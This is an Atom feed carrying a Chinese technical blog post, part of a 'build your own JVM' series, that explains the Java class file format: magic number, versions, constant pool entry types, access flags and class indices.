<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小叹</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-11-14T03:38:31.814Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>手撸一个JVM虚拟机--class文件解析</title>
    <link href="http://yoursite.com/2021/11/14/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--class%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/"/>
    <id>http://yoursite.com/2021/11/14/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--class%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/</id>
    <published>2021-11-14T03:23:01.000Z</published>
    <updated>2021-11-14T03:38:31.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  Java程序“编写一次，处处实现”，为了实现这一目标，Java规范严格规范了class文件的文件格式。Class文件一般采用类似于C语言结构体的伪结构来储存数据，主要由无符号数和表组成，构成class文件的基本数据单位是字节。可以将class文件当做字节流来处理，这些数据做class文件中以打断的方式。在class的文件格式中，Java虚拟机规范定义了u1、u2、u3三种数据类型来表示1、2和4字节无符号整数，分别对应golang中的uint8、uint16和uint32类型，无论是无符号数还是表， 当需要描述同一类型但数量不定的多个数据时， 经常会使用一个前置的容量计数器加若干个连续的数据项的形式， 这时候称这一系列连续的某一类型的数据为某一类型的“集合”。</p><h1 id="类文件简述"><a href="#类文件简述" class="headerlink" title="类文件简述"></a>类文件简述</h1><h2 id="类文件结构"><a href="#类文件结构" class="headerlink" title="类文件结构"></a>类文件结构</h2><table><thead><tr><th align="center">类型</th><th>名称</th><th>数量</th></tr></thead><tbody><tr><td align="center">u4</td><td>magic</td><td>1</td></tr><tr><td align="center">u2</td><td>minor_version</td><td>1</td></tr><tr><td align="center">u2</td><td>major_version</td><td>1</td></tr><tr><td align="center">u2</td><td>constant_pool_count</td><td>1</td></tr><tr><td align="center">cp_info</td><td>constant_pool</td><td>constant_pool_count-1</td></tr><tr><td align="center">u2</td><td>access_flags</td><td>1</td></tr><tr><td align="center">u2</td><td>this_class</td><td>1</td></tr><tr><td align="center">u2</td><td>super_class</td><td>1</td></tr><tr><td align="center">u2</td><td>interfaces_count</td><td>1</td></tr><tr><td align="center">u2</td><td>interfaces</td><td>interfaces_count</td></tr><tr><td align="center">u2</td><td>fields_count</td><td>1</td></tr><tr><td align="center">field_info</td><td>fields</td><td>fields_count</td></tr><tr><td align="center">u2</td><td>methods_count</td><td>1</td></tr><tr><td align="center">method_info</td><td>methods</td><td>methods_count</td></tr><tr><td align="center">u2</td><td>attributes_count</td><td>1</td></tr><tr><td align="center">attribute_info</td><td>attributes</td><td>attributes_count</td></tr></tbody></table><h2 id="魔数和Java版本号"><a href="#魔数和Java版本号" class="headerlink" title="魔数和Java版本号"></a>魔数和Java版本号</h2><p>Java的头四个字节被称为魔数，很多文件格式都会规定满足该格式的文件必须以某几个固定字节开头，这几个字节主要起标识作用，叫做魔数。例如PDF为“%PDF”（0x25，0x50，0x44，0x46）开头，而class文件的魔术是“0x CAFEBABE”。</p><p>紧接着魔术的存储着4个字节的版本号，第5、6个字节是次版本号，第7、8个字节是主版本号。</p><h2 id="常量池"><a href="#常量池" class="headerlink" title="常量池"></a>常量池</h2><p>在版本号之后的就是Java的常量池类，常量池占据了class文件很大一部分数据，里面存放着各式各样的常量信息，包括数字和字符串常量，常量池入口需要放置一项u2类型的数据，代表常量池容量计数值（constant_pool_count）,但是表头给出的值是从1开始的，所以表头给出的值比实际大1.例如下图，常量池的偏移地址是0x00000008，即0x003B，实际值就是58.设计者将第0项常量空出来是有特殊考虑的， 这样做的目的在于， 如果后面某些指向常量池的索引值的数据在特定情况下需要表达“不引用任何一个常量池项目”的含义， 可以把索引值设置为0来表示。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvvva4gmbyj31ep0u0wt3.jpg" alt=""></p><p>常量池主要存放两大类常量：字面量和符号引用。如下图：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvvvkacrmhj30ek0iiabx.jpg" alt=""></p><table><tbody><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">类型</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">项目</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">类型</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">描述</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle"><p align="left">CONSTANT_Utf8_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为1</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">length</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">utf-8缩略编码字符串占用字节数</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">bytes</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">长度为length的utf-8缩略编码字符串</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_Integer_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为3</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">bytes</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u4</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">按照高位在前储存的int值</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_Float_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为4</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">bytes</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u4</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">按照高位在前储存的float值</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_Long_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为5</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">bytes</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u8</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">按照高位在前储存的long值</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_Double_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为6</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">bytes</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u8</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">按照高位在前储存的double值</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_Class_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为7</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向全限定名常量项的索引</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_String_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为8</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向字符串字面量的索引</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle"><p align="left">CONSTANT_Fieldref_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为9</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向声明字段的类或接口描述符CONSTANT_Class_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向字段描述符CONSTANT_NameAndType_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle"><p align="left">CONSTANT_Methodref_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为10</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向声明方法的类描述符CONSTANT_Class_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向名称及类型描述符CONSTANT_NameAndType_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle"><p align="left">CONSTANT_InterfaceMethodref_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为11</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向声明方法的接口描述符CONSTANT_Class_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向名称及类型描述符CONSTANT_NameAndType_info的索引项</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle"><p align="left">CONSTANT_NameAndType_info</p><p align="left">&nbsp;</p><p align="left">&nbsp;</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为12</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向该字段或方法名称常量项的索引</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">index</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">指向该字段或方法描述符常量项的索引</p><div>&nbsp;</div></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle">CONSTANT_MethodHandle_info</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1　　</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为15</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">refrence_kind</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须在1-9之间，决定了方法句柄的类型，方法句柄的类型的值表示方法句柄字节码的行为</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">refrence_index</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须是对常量池的有效索引</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle">CONSTANT_MethodType_info</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">tag</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值为16</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">descriptor_index</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对常量池的有效索引，常量池在该处的项必须是CONSTANT_Utf8_info表示方法的描述符</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle">CONSTANT_Dynamic_info</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">tab</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值为17</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">bootstrap_method_attr_index</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对当前Class文件中引导方法表的bootstrap_methods[]数组的有效索引</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">name_and_type_index</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对当前常量池的有效索引，常量池中在该索引出的项必须是CONSTANT_NameAndType_info结构，表示方法名和方法描述符</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle">CONSTANT_InvokeDynamic_info</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">tag　</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值为18</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">bootstrap_method_attr_index</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对当前Class文件中引导方法表的bootstrap_methods[]数组的有效索引</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">name_and_type_index</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对当前常量池的有效索引，常量池中在该索引出的项必须是CONSTANT_NameAndType_info结构，表示方法名和方法描述符</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle">CONSTANT_Module_info</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">tag</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值为19</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">name_index</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对常量池的有效索引，常量池在该处的项必须是CONSTANT_Utf8_info表示模块名</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle">CONSTANT_Package_info</td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">tag</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u1</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值为20</td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">name_index</td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">u2</td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle">值必须对常量池的有效索引，常量池在该处的项必须是CONSTANT_Utf8_info表示包名</td></tr></tbody</table><table><thead><tr><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">—-</td><td align="left"></td></tr><tr><td align="left">## 类访问标志</td><td align="left"></td></tr></tbody></table><p>在常量池后就是类访问标志(access_flags),用于识别class文件内是类还是接口，是公有还是私有。如果是类的话，是否被声明为final等。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvw71lxc8zj31fu0u0ncd.jpg" alt=""></p><h2 id="类和超类索引"><a href="#类和超类索引" class="headerlink" title="类和超类索引"></a>类和超类索引</h2><p>类访问标志之后是两个u2类型的常量池索引，分别给出类名和超类名.class文件存储的类名类似完全限定名，但是把点换成了斜线，Java语言规范把这种名字叫做二进制名。除了java.lang.Object之外，其他类都有超类，所以superclass只在Object.class中是0.</p><p>name_index和descriptor_index。 它们都是对常量池项的引用， 分别代表着字段的简单名称以及字段和方法的描述符。<br>　　全限定名:仅仅是把类全名中的“.”替换成了“/”而已，例如类名org.apache.xxxx，器全限定名为org/apache/xxxx。<br>　　简单名称:就是指没有类型和参数修饰的方法或者字段名称， 比如类中的inc()方法和m字段的简单名称分别就是“inc”和“m”。<br>　　方法和字段的描述符：描述符的作用是用来描述字段的数据类型、 方法的参数列表（包括数量、 类型以及顺序） 和返回值。 根据描述符规则， 基本数据类型（byte、 char、 double、 float、 int、 long、 short、 boolean） 以及代表无返回值的void类型都用一个大写字符来表示， 而对象类型则用字符L加对象的全限定名来表示。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw0hbqixsgj31g20u07i2.jpg" alt=""></p><h2 id="接口索引表"><a href="#接口索引表" class="headerlink" title="接口索引表"></a>接口索引表</h2><p>类和超类索引后面是接口索引表，表中存放的也是常量池索引，给出该类实现的所有接口的名字，示例代码没有实现接口。</p><h2 